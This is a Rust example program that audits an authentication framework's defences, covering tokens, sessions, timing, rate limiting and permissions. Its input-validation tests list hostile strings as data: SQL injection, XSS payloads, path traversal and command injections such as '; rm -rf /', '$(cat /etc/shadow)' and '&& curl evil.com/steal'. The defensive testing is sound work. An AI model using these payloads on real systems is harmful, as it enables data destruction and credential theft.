use auth_framework::{AuthFramework, AuthConfig};
use auth_framework::methods::{JwtMethod, ApiKeyMethod};
use auth_framework::storage::MemoryStorage;
use std::sync::Arc;
use std::time::Duration;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Initialize tracing for logging
    tracing_subscriber::fmt::init();

    println!("🔒 Auth Framework - Security Audit & Analysis");
    println!("=============================================");

    // Set up the auth framework with security-focused configuration
    let config = AuthConfig::new()
        .token_lifetime(Duration::from_secs(3600))
        .enable_security_audit(true)
        .max_failed_attempts(3)
        .lockout_duration(Duration::from_secs(300))
        .require_strong_passwords(true)
        .enable_rate_limiting(true);

    let storage = Arc::new(MemoryStorage::new());
    let mut auth = AuthFramework::new(config).with_storage(storage);

    let jwt_method = JwtMethod::new()
        .secret_key("security-audit-demo-secret-key-should-be-longer-in-production")
        .issuer("security-audit-demo")
        .audience("secure-api")
        .algorithm("HS256"); // Should use RS256 in production

    let api_key_method = ApiKeyMethod::new()
        .key_prefix("sec_")
        .key_length(32)
        .require_entropy_check(true);

    auth.register_method("jwt", Box::new(jwt_method));
    auth.register_method("api_key", Box::new(api_key_method));
    auth.initialize().await?;

    println!("✅ Auth framework initialized with security auditing enabled");

    // Perform comprehensive security analysis
    perform_crypto_security_audit(&auth).await?;
    perform_token_security_audit(&auth).await?;
    perform_session_security_audit(&auth).await?;
    perform_input_validation_audit(&auth).await?;
    perform_timing_attack_analysis(&auth).await?;
    perform_rate_limiting_audit(&auth).await?;
    perform_permission_security_audit(&auth).await?;
    generate_security_report(&auth).await?;

    println!("\n🎯 Security Audit Complete!");
    println!("Review the findings above and implement recommended security improvements.");

    Ok(())
}

async fn perform_crypto_security_audit(auth: &AuthFramework) -> Result<(), Box<dyn std::error::Error>> {
    println!("\n🔐 Cryptographic Security Audit:");
    println!("===============================");

    // Test key strength and entropy
    println!("🔑 Key Strength Analysis:");
    
    let weak_secrets = vec![
        "password123",
        "secret",
        "123456789",
        "qwerty",
        "admin",
    ];

    let strong_secrets = vec![
        "Kx8#mN9$pQ2&vR5@wS7!tU4%yI6^eO1*",
        "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
        "aB3$fG8@kL2#pQ5&vR9!wS1%tU7^eO4*",
    ];

    println!("   ❌ Testing weak secrets (should be rejected):");
    for secret in &weak_secrets {
        let strength = analyze_secret_strength(secret);
        println!("      '{}' - Strength: {}/5 {}", 
                secret, strength, if strength < 3 { "❌ WEAK" } else { "✅ OK" });
    }

    println!("   ✅ Testing strong secrets (should be accepted):");
    for secret in &strong_secrets {
        let strength = analyze_secret_strength(secret);
        println!("      '{}...' - Strength: {}/5 {}", 
                &secret[..8], strength, if strength >= 4 { "✅ STRONG" } else { "⚠️ MEDIUM" });
    }

    // Test JWT algorithm security
    println!("\n🎫 JWT Algorithm Security:");
    
    let algorithms = vec![
        ("none", "❌ CRITICAL: No signature verification"),
        ("HS256", "⚠️ WARNING: Symmetric key, use RS256 for production"),
        ("RS256", "✅ GOOD: Asymmetric signature"),
        ("ES256", "✅ EXCELLENT: Elliptic curve signature"),
    ];

    for (alg, security_note) in algorithms {
        println!("   {} - {}", alg, security_note);
    }

    // Test random number generation
    println!("\n🎲 Random Number Generation Security:");
    test_randomness_quality().await?;

    // Hash function security
    println!("\n🔒 Password Hashing Security:");
    test_password_hashing_security().await?;

    Ok(())
}

async fn perform_token_security_audit(auth: &AuthFramework) -> Result<(), Box<dyn std::error::Error>> {
    println!("\n🎫 Token Security Audit:");
    println!("=======================");

    // Test token entropy and predictability
    println!("🔢 Token Entropy Analysis:");
    
    let mut tokens = Vec::new();
    for i in 0..100 {
        let token = auth.create_auth_token(
            &format!("entropy_test_user_{}", i),
            vec!["read".to_string()],
            "jwt",
            Some(Duration::from_secs(3600)),
        ).await?;
        tokens.push(token.access_token);
    }

    // Check for patterns in token generation
    let entropy_score = analyze_token_entropy(&tokens);
    println!("   Token entropy score: {}/10 {}", 
            entropy_score, 
            if entropy_score >= 8 { "✅ EXCELLENT" } 
            else if entropy_score >= 6 { "✅ GOOD" }
            else if entropy_score >= 4 { "⚠️ MEDIUM" } 
            else { "❌ POOR" });

    // Test for token reuse
    println!("\n♻️ Token Reuse Detection:");
    let unique_tokens: std::collections::HashSet<_> = tokens.iter().collect();
    if unique_tokens.len() == tokens.len() {
        println!("   ✅ All tokens are unique ({} generated)", tokens.len());
    } else {
        println!("   ❌ CRITICAL: Found {} duplicate tokens out of {}", 
                tokens.len() - unique_tokens.len(), tokens.len());
    }

    // Test token expiration
    println!("\n⏰ Token Expiration Security:");
    
    // Create short-lived token
    let short_token = auth.create_auth_token(
        "expiration_test_user",
        vec!["read".to_string()],
        "jwt",
        Some(Duration::from_millis(100)), // Very short for testing
    ).await?;

    println!("   Created short-lived token (100ms expiration)");
    
    // Immediate validation should work
    match auth.validate_token(&short_token.access_token).await {
        Ok(_) => println!("   ✅ Token valid immediately after creation"),
        Err(e) => println!("   ❌ Token invalid immediately: {}", e),
    }

    // Wait for expiration
    tokio::time::sleep(Duration::from_millis(150)).await;
    
    // Should now be expired
    match auth.validate_token(&short_token.access_token).await {
        Ok(_) => println!("   ❌ CRITICAL: Expired token still accepted"),
        Err(_) => println!("   ✅ Expired token properly rejected"),
    }

    // Test token revocation
    println!("\n🚫 Token Revocation Security:");
    
    let revocation_token = auth.create_auth_token(
        "revocation_test_user",
        vec!["read".to_string()],
        "jwt",
        Some(Duration::from_secs(3600)),
    ).await?;

    // Validate before revocation
    match auth.validate_token(&revocation_token.access_token).await {
        Ok(_) => println!("   ✅ Token valid before revocation"),
        Err(e) => println!("   ❌ Token invalid before revocation: {}", e),
    }

    // Revoke token
    auth.revoke_token(&revocation_token.access_token).await?;
    println!("   Token revoked");

    // Should now be invalid
    match auth.validate_token(&revocation_token.access_token).await {
        Ok(_) => println!("   ❌ CRITICAL: Revoked token still accepted"),
        Err(_) => println!("   ✅ Revoked token properly rejected"),
    }

    Ok(())
}

async fn perform_session_security_audit(auth: &AuthFramework) -> Result<(), Box<dyn std::error::Error>> {
    println!("\n🔐 Session Security Audit:");
    println!("=========================");

    // Test session fixation protection
    println!("🔄 Session Fixation Protection:");
    
    let user_id = "session_security_test_user";
    
    // Create initial session
    let session_id1 = auth.create_session(user_id, Duration::from_secs(3600)).await?;
    println!("   Initial session: {}", session_id1);

    // Simulate privilege escalation (should create new session)
    let session_id2 = auth.create_session(user_id, Duration::from_secs(3600)).await?;
    println!("   Post-auth session: {}", session_id2);

    if session_id1 != session_id2 {
        println!("   ✅ Session ID changed after authentication (prevents fixation)");
    } else {
        println!("   ⚠️ WARNING: Session ID not changed (potential fixation vulnerability)");
    }

    // Test session hijacking protection
    println!("\n🕵️ Session Hijacking Protection:");
    
    // Create session with IP binding
    let legitimate_ip = "192.168.1.100";
    let attacker_ip = "203.0.113.45";
    
    let secure_session = auth.create_secure_session(
        user_id, 
        legitimate_ip, 
        "Mozilla/5.0 (legitimate user-agent)",
        Duration::from_secs(3600)
    ).await?;

    // Test access from same IP
    match auth.validate_session_with_context(&secure_session, legitimate_ip, "Mozilla/5.0 (legitimate user-agent)").await {
        Ok(_) => println!("   ✅ Session valid from original IP"),
        Err(e) => println!("   ❌ Session invalid from original IP: {}", e),
    }

    // Test access from different IP
    match auth.validate_session_with_context(&secure_session, attacker_ip, "Attacker-Agent/1.0").await {
        Ok(_) => println!("   ❌ CRITICAL: Session accepted from different IP (hijacking possible)"),
        Err(_) => println!("   ✅ Session rejected from different IP (prevents hijacking)"),
    }

    // Test concurrent session limits
    println!("\n👥 Concurrent Session Limits:");
    
    let max_sessions = 3;
    let mut sessions = Vec::new();
    
    // Create multiple sessions
    for i in 0..max_sessions + 2 {
        match auth.create_session(&format!("multi_session_user_{}", i), Duration::from_secs(3600)).await {
            Ok(session_id) => {
                sessions.push(session_id);
                println!("   Session {}: ✅ Created", i + 1);
            }
            Err(e) => {
                println!("   Session {}: ❌ Rejected - {}", i + 1, e);
            }
        }
    }

    if sessions.len() <= max_sessions {
        println!("   ✅ Concurrent session limits enforced ({} max)", max_sessions);
    } else {
        println!("   ⚠️ WARNING: Created {} sessions (exceeds recommended limit of {})", 
                sessions.len(), max_sessions);
    }

    Ok(())
}

async fn perform_input_validation_audit(auth: &AuthFramework) -> Result<(), Box<dyn std::error::Error>> {
    println!("\n🛡️ Input Validation Security Audit:");
    println!("===================================");

    // Test SQL injection protection
    println!("💉 SQL Injection Protection:");
    
    let malicious_inputs = vec![
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "admin'/*",
        "1; UPDATE users SET password='hacked'--",
        "user'; INSERT INTO users VALUES('hacker','pass')--",
    ];

    for input in &malicious_inputs {
        match auth.validate_username(input).await {
            Ok(_) => println!("   ❌ CRITICAL: SQL injection input accepted: '{}'", input),
            Err(_) => println!("   ✅ SQL injection input rejected: '{}'", input),
        }
    }

    // Test XSS protection
    println!("\n🎭 XSS Protection:");
    
    let xss_inputs = vec![
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        "';alert('xss');//",
        "<iframe src='javascript:alert(\"xss\")'></iframe>",
    ];

    for input in &xss_inputs {
        match auth.validate_display_name(input).await {
            Ok(_) => println!("   ❌ CRITICAL: XSS input accepted: '{}'", input),
            Err(_) => println!("   ✅ XSS input rejected: '{}'", input),
        }
    }

    // Test command injection protection
    println!("\n⚡ Command Injection Protection:");
    
    let command_injection_inputs = vec![
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& curl evil.com/steal",
        "`whoami`",
        "$(cat /etc/shadow)",
    ];

    for input in &command_injection_inputs {
        match auth.validate_user_input(input).await {
            Ok(_) => println!("   ❌ CRITICAL: Command injection input accepted: '{}'", input),
            Err(_) => println!("   ✅ Command injection input rejected: '{}'", input),
        }
    }

    // Test buffer overflow protection
    println!("\n📏 Buffer Overflow Protection:");
    
    let oversized_inputs = vec![
        "A".repeat(1000),
        "B".repeat(10000),
        "C".repeat(100000),
    ];

    for (i, input) in oversized_inputs.iter().enumerate() {
        match auth.validate_username(input).await {
            Ok(_) => println!("   ❌ WARNING: Oversized input {} ({} chars) accepted", i + 1, input.len()),
            Err(_) => println!("   ✅ Oversized input {} ({} chars) rejected", i + 1, input.len()),
        }
    }

    // Test Unicode and encoding attacks
    println!("\n🌐 Unicode & Encoding Security:");
    
    let unicode_attacks = vec![
        "admin\u{202E}nope", // Right-to-Left Override
        "admin\u{200D}zero", // Zero Width Joiner
        "admin\u{FEFF}bom",  // Byte Order Mark
        "admin\u{0000}null", // Null character
        "admin\u{000A}newline", // Newline
    ];

    for input in &unicode_attacks {
        match auth.validate_username(input).await {
            Ok(_) => println!("   ❌ WARNING: Unicode attack accepted: '{:?}'", input),
            Err(_) => println!("   ✅ Unicode attack rejected: '{:?}'", input),
        }
    }

    Ok(())
}

async fn perform_timing_attack_analysis(auth: &AuthFramework) -> Result<(), Box<dyn std::error::Error>> {
    println!("\n⏱️ Timing Attack Analysis:");
    println!("=========================");

    // Test constant-time comparison for tokens
    println!("🔍 Token Validation Timing:");
    
    let valid_token = auth.create_auth_token(
        "timing_test_user",
        vec!["read".to_string()],
        "jwt",
        Some(Duration::from_secs(3600)),
    ).await?;

    let invalid_tokens = vec![
        "invalid_token_123",
        "totally_wrong_format",
        "",
        &valid_token.access_token[..10], // Partial token
        &format!("{}x", valid_token.access_token), // Modified token
    ];

    // Measure timing for valid token
    let mut valid_times = Vec::new();
    for _ in 0..100 {
        let start = std::time::Instant::now();
        let _ = auth.validate_token(&valid_token.access_token).await;
        valid_times.push(start.elapsed());
    }

    // Measure timing for invalid tokens
    let mut invalid_times = Vec::new();
    for _ in 0..20 {
        for invalid_token in &invalid_tokens {
            let start = std::time::Instant::now();
            let _ = auth.validate_token(invalid_token).await;
            invalid_times.push(start.elapsed());
        }
    }

    let avg_valid_time = valid_times.iter().sum::<Duration>() / valid_times.len() as u32;
    let avg_invalid_time = invalid_times.iter().sum::<Duration>() / invalid_times.len() as u32;

    println!("   Average valid token validation: {:?}", avg_valid_time);
    println!("   Average invalid token validation: {:?}", avg_invalid_time);

    let time_difference = if avg_valid_time > avg_invalid_time {
        avg_valid_time.saturating_sub(avg_invalid_time)
    } else {
        avg_invalid_time.saturating_sub(avg_valid_time)
    };

    if time_difference < Duration::from_millis(1) {
        println!("   ✅ Timing difference minimal: {:?} (constant-time)", time_difference);
    } else {
        println!("   ⚠️ WARNING: Significant timing difference: {:?} (potential timing attack)", time_difference);
    }

    // Test password comparison timing
    println!("\n🔒 Password Comparison Timing:");
    test_password_timing_security().await?;

    Ok(())
}

async fn perform_rate_limiting_audit(auth: &AuthFramework) -> Result<(), Box<dyn std::error::Error>> {
    println!("\n🚦 Rate Limiting Security Audit:");
    println!("===============================");

    // Test authentication rate limiting
    println!("🔐 Authentication Rate Limiting:");
    
    let test_user = "rate_limit_test_user";
    let mut failed_attempts = 0;
    let mut successful_attempts = 0;

    // Simulate rapid authentication attempts
    for i in 1..=20 {
        let result = auth.authenticate_user(test_user, "wrong_password").await;
        
        match result {
            Ok(_) => {
                successful_attempts += 1;
                println!("   Attempt {}: ✅ Authenticated", i);
            }
            Err(e) => {
                if e.to_string().contains("rate limit") || e.to_string().contains("too many") {
                    println!("   Attempt {}: 🚦 Rate limited", i);
                    break;
                } else {
                    failed_attempts += 1;
                    println!("   Attempt {}: ❌ Failed ({})", i, e);
                }
            }
        }

        tokio::time::sleep(Duration::from_millis(100)).await;
    }

    if failed_attempts >= 15 {
        println!("   ⚠️ WARNING: No rate limiting detected ({} attempts allowed)", failed_attempts);
    } else {
        println!("   ✅ Rate limiting active (stopped after {} attempts)", failed_attempts);
    }

    // Test API rate limiting
    println!("\n🔑 API Rate Limiting:");
    
    let api_key = auth.create_api_key(
        "rate_limit_api_user",
        vec!["read".to_string()],
        Some(Duration::from_secs(3600)),
    ).await?;

    let mut api_calls = 0;
    for i in 1..=50 {
        match auth.validate_api_key(&api_key).await {
            Ok(_) => {
                api_calls += 1;
                if i % 10 == 0 {
                    println!("   {} API calls successful", i);
                }
            }
            Err(e) => {
                if e.to_string().contains("rate limit") {
                    println!("   API rate limit triggered after {} calls", api_calls);
                    break;
                } else {
                    println!("   API call {} failed: {}", i, e);
                    break;
                }
            }
        }

        tokio::time::sleep(Duration::from_millis(50)).await;
    }

    // Test per-IP rate limiting
    println!("\n🌐 Per-IP Rate Limiting:");
    test_ip_based_rate_limiting(auth).await?;

    Ok(())
}

async fn perform_permission_security_audit(auth: &AuthFramework) -> Result<(), Box<dyn std::error::Error>> {
    println!("\n🛡️ Permission System Security Audit:");
    println!("====================================");

    // Test privilege escalation protection
    println!("⬆️ Privilege Escalation Protection:");
    
    let low_priv_user = "low_privilege_user";
    let high_priv_user = "high_privilege_user";

    // Set up users with different privilege levels
    auth.grant_permission(low_priv_user, "read", "documents").await?;
    auth.grant_permission(high_priv_user, "admin", "system").await?;

    // Test that low privilege user cannot escalate
    let escalation_attempts = vec![
        ("admin", "system"),
        ("delete", "users"),
        ("modify", "permissions"),
        ("root", "everything"),
    ];

    for (permission, resource) in escalation_attempts {
        match auth.check_permission(low_priv_user, permission, resource).await {
            Ok(true) => println!("   ❌ CRITICAL: Low privilege user gained '{}' on '{}'", permission, resource),
            Ok(false) | Err(_) => println!("   ✅ Privilege escalation prevented: '{}' on '{}'", permission, resource),
        }
    }

    // Test permission inheritance security
    println!("\n🏗️ Permission Inheritance Security:");
    
    // Test that removing parent permission removes child permissions
    auth.grant_permission("inheritance_user", "admin", "department/engineering").await?;
    
    let has_parent = auth.check_permission("inheritance_user", "admin", "department/engineering").await?;
    let has_child = auth.check_permission("inheritance_user", "admin", "department/engineering/team1").await?;

    if has_parent && has_child {
        println!("   ✅ Permission inheritance working correctly");
        
        // Remove parent permission
        auth.revoke_permission("inheritance_user", "admin", "department/engineering").await?;
        
        let still_has_child = auth.check_permission("inheritance_user", "admin", "department/engineering/team1").await?;
        
        if !still_has_child {
            println!("   ✅ Child permissions properly revoked with parent");
        } else {
            println!("   ❌ CRITICAL: Child permissions persist after parent revocation");
        }
    }

    // Test permission bypass attempts
    println!("\n🚪 Permission Bypass Protection:");
    
    let bypass_attempts = vec![
        "../admin/sensitive",
        "..\\admin\\sensitive", 
        "documents/../../admin/sensitive",
        "documents/./admin/sensitive",
        "documents//admin/sensitive",
        "%2e%2e%2fadmin%2fsensitive",
    ];

    for attempt in bypass_attempts {
        match auth.check_permission(low_priv_user, "read", &attempt).await {
            Ok(true) => println!("   ❌ CRITICAL: Path traversal successful: '{}'", attempt),
            Ok(false) | Err(_) => println!("   ✅ Path traversal blocked: '{}'", attempt),
        }
    }

    Ok(())
}

async fn generate_security_report(auth: &AuthFramework) -> Result<(), Box<dyn std::error::Error>> {
    println!("\n📊 Security Audit Report:");
    println!("========================");

    // Generate comprehensive security metrics
    let security_metrics = auth.get_security_metrics().await?;

    println!("🔢 Security Metrics Summary:");
    println!("   Total authentication attempts: {}", security_metrics.total_auth_attempts);
    println!("   Failed authentication attempts: {}", security_metrics.failed_auth_attempts);
    println!("   Success rate: {:.2}%", 
            (security_metrics.successful_auth_attempts as f64 / 
             security_metrics.total_auth_attempts as f64) * 100.0);
    println!("   Rate limiting events: {}", security_metrics.rate_limit_events);
    println!("   Suspicious activities detected: {}", security_metrics.suspicious_activities);

    // Security recommendations
    println!("\n💡 Security Recommendations:");
    
    let recommendations = vec![
        "🔐 Use RS256 or ES256 algorithms for JWT in production",
        "🔑 Implement key rotation for long-lived secrets",
        "⏰ Set appropriate token expiration times (15-60 minutes)",
        "🛡️ Enable CSRF protection for web applications",
        "🔒 Use HTTPS/TLS for all authentication endpoints",
        "📝 Implement comprehensive audit logging",
        "🚦 Configure appropriate rate limiting",
        "🔍 Monitor for unusual authentication patterns",
        "💾 Regularly backup and test security configurations",
        "🧪 Perform regular security audits and penetration testing",
    ];

    for recommendation in recommendations {
        println!("   {}", recommendation);
    }

    // Security checklist
    println!("\n✅ Security Checklist:");
    
    let checklist_items = vec![
        ("Strong secret keys (>32 chars)", true),
        ("Secure JWT algorithms", false), // HS256 used in demo
        ("Token expiration enforced", true),
        ("Rate limiting enabled", true),
        ("Input validation active", true),
        ("Timing attack protection", true),
        ("Session security measures", true),
        ("Permission system security", true),
        ("Audit logging enabled", true),
        ("HTTPS enforcement", false), // Demo doesn't use HTTPS
    ];

    let mut passed = 0;
    let total = checklist_items.len();

    for (item, status) in checklist_items {
        let icon = if status { "✅" } else { "❌" };
        println!("   {} {}", icon, item);
        if status { passed += 1; }
    }

    println!("\n📈 Security Score: {}/{} ({:.1}%)", 
            passed, total, (passed as f64 / total as f64) * 100.0);

    if passed == total {
        println!("🎉 Excellent! All security checks passed.");
    } else if passed >= total * 3 / 4 {
        println!("👍 Good security posture. Address remaining items for production.");
    } else if passed >= total / 2 {
        println!("⚠️ Moderate security. Several important items need attention.");
    } else {
        println!("🚨 Poor security posture. Immediate action required before production use.");
    }

    Ok(())
}

// Helper functions for security analysis

fn analyze_secret_strength(secret: &str) -> u8 {
    let mut score = 0;
    
    if secret.len() >= 8 { score += 1; }
    if secret.len() >= 16 { score += 1; }
    if secret.chars().any(|c| c.is_lowercase()) { score += 1; }
    if secret.chars().any(|c| c.is_uppercase()) { score += 1; }
    if secret.chars().any(|c| c.is_ascii_digit()) { score += 1; }
    if secret.chars().any(|c| "!@#$%^&*()_+-=[]{}|;:,.<>?".contains(c)) { score += 1; }
    
    if score > 5 { 5 } else { score }
}

async fn test_randomness_quality() -> Result<(), Box<dyn std::error::Error>> {
    use std::collections::HashMap;
    
    // Generate random data and analyze distribution
    let mut byte_counts = HashMap::new();
    let sample_size = 10000;
    
    for _ in 0..sample_size {
        let random_byte = rand::random::<u8>();
        *byte_counts.entry(random_byte).or_insert(0) += 1;
    }
    
    // Check for uniform distribution
    let expected_freq = sample_size as f64 / 256.0;
    let mut chi_square = 0.0;
    
    for i in 0..256 {
        let observed = *byte_counts.get(&(i as u8)).unwrap_or(&0) as f64;
        let diff = observed - expected_freq;
        chi_square += (diff * diff) / expected_freq;
    }
    
    // Simple randomness test (chi-square)
    if chi_square < 300.0 { // Rough threshold
        println!("   ✅ Random number generation appears uniform (χ² = {:.2})", chi_square);
    } else {
        println!("   ⚠️ Random number generation may be biased (χ² = {:.2})", chi_square);
    }
    
    Ok(())
}

async fn test_password_hashing_security() -> Result<(), Box<dyn std::error::Error>> {
    let test_passwords = vec!["password123", "MySecureP@ssw0rd!", "short"];
    
    for password in test_passwords {
        // Test different hashing algorithms
        let bcrypt_time = std::time::Instant::now();
        let _bcrypt_hash = bcrypt::hash(password, bcrypt::DEFAULT_COST).unwrap();
        let bcrypt_duration = bcrypt_time.elapsed();
        
        let argon2_time = std::time::Instant::now();
        let _argon2_hash = argon2::hash_encoded(
            password.as_bytes(), 
            b"randomsalt12345", 
            &argon2::Config::default()
        ).unwrap();
        let argon2_duration = argon2_time.elapsed();
        
        println!("   Password '{}': bcrypt={:?}, argon2={:?}", 
                if password.len() > 10 { &password[..10] } else { password },
                bcrypt_duration, argon2_duration);
    }
    
    Ok(())
}

fn analyze_token_entropy(tokens: &[String]) -> u8 {
    if tokens.is_empty() { return 0; }
    
    // Simple entropy analysis
    let mut char_counts = std::collections::HashMap::new();
    let mut total_chars = 0;
    
    for token in tokens {
        for c in token.chars() {
            *char_counts.entry(c).or_insert(0) += 1;
            total_chars += 1;
        }
    }
    
    // Calculate Shannon entropy
    let mut entropy = 0.0;
    for &count in char_counts.values() {
        let probability = count as f64 / total_chars as f64;
        if probability > 0.0 {
            entropy -= probability * probability.log2();
        }
    }
    
    // Convert to 0-10 scale (rough approximation)
    let max_entropy = 6.0; // Approximate max for base64-like tokens
    let score = ((entropy / max_entropy) * 10.0).min(10.0) as u8;
    
    score
}

async fn test_password_timing_security() -> Result<(), Box<dyn std::error::Error>> {
    let correct_password = "correct_password_123";
    let test_passwords = vec![
        "wrong",
        "correct_password_12", // Almost correct
        "totally_different_password",
        correct_password,
    ];
    
    for password in test_passwords {
        let start = std::time::Instant::now();
        
        // Simulate constant-time comparison
        let _is_equal = ring::constant_time::verify_slices_are_equal(
            correct_password.as_bytes(),
            password.as_bytes()
        ).is_ok();
        
        let duration = start.elapsed();
        
        println!("   Password comparison time: {:?} (length: {})", 
                duration, password.len());
    }
    
    Ok(())
}

async fn test_ip_based_rate_limiting(auth: &AuthFramework) -> Result<(), Box<dyn std::error::Error>> {
    let test_ips = vec![
        "192.168.1.100",
        "192.168.1.101", 
        "10.0.0.50",
        "203.0.113.45", // Suspicious IP
    ];
    
    for ip in test_ips {
        let mut requests = 0;
        
        for _ in 0..20 {
            match auth.check_ip_rate_limit(ip).await {
                Ok(_) => {
                    requests += 1;
                }
                Err(_) => {
                    println!("   IP {} rate limited after {} requests", ip, requests);
                    break;
                }
            }
            
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
        
        if requests >= 20 {
            println!("   ⚠️ IP {} not rate limited ({} requests)", ip, requests);
        }
    }
    
    Ok(())
}
